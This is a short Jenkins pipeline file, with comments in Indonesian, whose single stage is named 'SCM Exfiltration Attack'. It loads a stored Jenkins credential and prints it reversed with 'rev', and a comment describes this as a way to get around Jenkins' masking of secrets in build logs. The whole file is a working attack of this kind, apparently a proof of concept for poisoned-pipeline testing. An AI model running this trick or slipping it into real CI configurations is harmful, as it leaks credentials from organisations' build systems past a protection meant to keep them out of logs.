pipeline {
    agent any
    environment {
        // ID ini harus sama dengan ID Credential yang ada di Jenkins Anda
        MY_SECRET = credentials('target-rahasia')
    }
    stages {
        stage('SCM Exfiltration Attack') {
            steps {
                script {
                    // Teknik bypass masking: membalik isi secret sebelum dicetak ke log
                    sh 'echo $MY_SECRET | rev'
                }
            }
        }
    }
}
